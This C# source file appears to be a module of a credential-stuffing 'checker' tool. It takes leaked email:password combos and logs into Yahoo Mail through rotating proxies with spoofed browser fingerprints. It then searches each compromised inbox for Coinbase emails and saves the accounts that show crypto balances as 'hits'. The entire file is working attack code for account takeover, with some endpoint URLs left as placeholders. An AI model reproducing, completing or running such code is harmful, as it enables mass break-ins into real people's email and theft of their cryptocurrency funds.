using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.Capture
{
    class CoinBaseDisable
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                httpRequest.AddHeader("Accept", "*/*");
                string str1 = httpRequest.Get("URL HERE").ToString();
                string ac = Cryptography.LR(str1, "acrumb\" value=\"", "\"").FirstOrDefault();
                string acr = Cryptography.LR(str1, "name=\"crumb\" value=\"", "\"").FirstOrDefault();
                string si = Cryptography.LR(str1, "\"sessionIndex\" value=\"", "\"").FirstOrDefault();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("Host", "login.yahoo.com");
                httpRequest.AddHeader("Origin", "https://login.yahoo.com");
                httpRequest.AddHeader("Referer", "");
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36");
                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                string str2 = httpRequest.Post("URL HERE", "browser-fp-data=%7B%22language%22%3A%22en-GB%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A6%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FTunis%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%226f6b3a1cdd756b937b638391e9896bc0%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(NVIDIA)~ANGLE%20(NVIDIA%2C%20NVIDIA%20GeForce%20GTX%201660%20SUPER%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11-27.21.14.5671)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221920%22%2C%22h%22%3A%221080%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%221040%22%2C%22h%22%3A%221920%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1635089977253%2C%22render%22%3A1635089976683%7D%7D&crumb="+ac+ "&acrumb="+acr+ "&sessionIndex="+si+ "&displayName=&deviceCapability=&username="+strArray1[0]+ "&passwd=&signin=Suivant", "application/x-www-form-urlencoded").ToString();

                if (str2.Contains("challenge/password"))
                {
                    httpRequest.ClearAllHeaders();
                    httpRequest.AllowAutoRedirect = false;

                    string loc = str2.Replace("{\"location\":\"", "").Replace("\"}", "");
                    httpRequest.AddHeader("Host", "login.yahoo.com");
                    httpRequest.AddHeader("Origin", "https://login.yahoo.com");
                    httpRequest.AddHeader("Referer", "URL HERE");
                    httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36");
                    httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                    string str3 = httpRequest.Post("https://login.yahoo.com" + loc, "browser-fp-data=%7B%22language%22%3A%22en-GB%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A6%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FTunis%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%226f6b3a1cdd756b937b638391e9896bc0%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google+Inc.+%28NVIDIA%29%7EANGLE+%28NVIDIA%2C+NVIDIA+GeForce+GTX+1660+SUPER+Direct3D11+vs_5_0+ps_5_0%2C+D3D11-27.21.14.5671%29%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221920%22%2C%22h%22%3A%221080%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%221040%22%2C%22h%22%3A%221920%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1635089980346%2C%22render%22%3A1635089979750%7D%7D&crumb=" + ac + "&acrumb=" + acr + "&sessionIndex=" + si + "&displayName=" + strArray1[0] + "&deviceCapability=&username=" + strArray1[0] + "&passwordContext=normal&isShowButtonClicked=&showButtonStatus=&prefersReducedMotion=&password=" + strArray1[1] + "&verifyPassword=Suivant", "application/x-www-form-urlencoded").ToString();

                    if (str3.Contains("https://api.login.yahoo.com/oauth2/"))
                    {

                        httpRequest.ClearAllHeaders();
                        httpRequest.AllowAutoRedirect = false;
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                        httpRequest.AddHeader("Accept", "*/*");
                        string str4 = httpRequest.Get("https://mail.yahoo.com/").ToString();

                        string mailWssid = Cryptography.LR(str4, "mailWssid\":\"", "\"").FirstOrDefault();

                        httpRequest.ClearAllHeaders();
                        httpRequest.AllowAutoRedirect = true;
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                        httpRequest.AddHeader("Accept", "*/*");
                        string str5 = httpRequest.Get("URL HERE" + mailWssid).ToString();

                        if (!str5.Contains("no-reply@coinbase.com"))
                        {
                            ++Program.Free;
                            ++Program.Check;
                            ++Program.Cps;
                            if (Program.Lock == "Y")
                            {
                                Console.WriteLine($" [+] {combo} ", Color.Orange);
                            }
                            Program.Save(combo, "CoinBase Free");
                            return true;
                        }
                        else
                        {
                            //hit
                            string cli = Cryptography.LR(str5, "You recently requested to reset your Coinbase account password. ", "\"extAcctFolderId\"").FirstOrDefault();
                            string ci = cli.Replace("\"conversationId\":\"", "");
                            string Bal = Cryptography.LR(str5, "\"subject\":\"Your available balance has increased by", "\",\"").FirstOrDefault();

                            httpRequest.ClearAllHeaders();
                            httpRequest.AllowAutoRedirect = true;
                            httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
                            httpRequest.AddHeader("Accept", "*/*");
                            string str6 = httpRequest.Get("URL HERE" + ci + "?.intl=xa&.lang=us-JO&.partner=none&.src=fp").ToString();

                            string cb1 = str6.Replace("your Coinbase account password.", "");
                            string cb = cb1.Replace(".\" href=\"/", "");

                            if (cb.Contains("I wish to disable sign-in for my Coinbase account"))
                            {
                                string bal = "100+";
                                Interlocked.Increment(ref Program.Good);
                                ++Program.Check;
                                ++Program.Cps;
                                Program.remove(combo);
                                if (Program.Lock == "Y")
                                {
                                    Console.WriteLine($" [+] {combo} | Balence: {bal}", Color.Green);
                                }
                                Program.Save(combo, "CoinBase ");
                                return true;
                            }
                            else
                            {
                                ++Program.Free;
                                ++Program.Check;
                                ++Program.Cps;
                                if (Program.Lock == "Y")
                                {
                                    Console.WriteLine($" [+] {combo} ", Color.Orange);
                                }
                                Program.Save(combo, "CoinBase Free");
                                return true;
                            }

                        }

                    }
                    else if (str3.Contains("/account/challenge/password?") || str3.Contains("/account/challenge/fail?"))
                    {
                        ++Program.Fail;
                        ++Program.Check;
                        ++Program.Cps;
                        Program.remove(combo);
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine("[-]" + combo, Color.Red);
                        }
                        //Program.Save(combo, "Invalids");
                        return true;
                    }
                    else if (str3.Contains("selector"))
                    {
                        ++Program.Free;
                        ++Program.Check;
                        ++Program.Cps;
                        if (Program.Lock == "Y")
                        {
                            Console.WriteLine($" [+] {combo} ", Color.Orange);
                        }
                        Program.Save(combo, "CoinBase Free");
                        return true;
                    }
                    else
                    {
                        ++Program.Retrie;
                        return false;
                    }

                }
                else if (str2.Contains("INVALID_USERNAME"))
                {
                    ++Program.Fail;
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    //Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Retrie;
                    return false;
                }
            }
            catch(Exception ex)
            {
                //Console.WriteLine(ex);
                ++Program.Retrie;
                return false;
            }
        }
    }
}
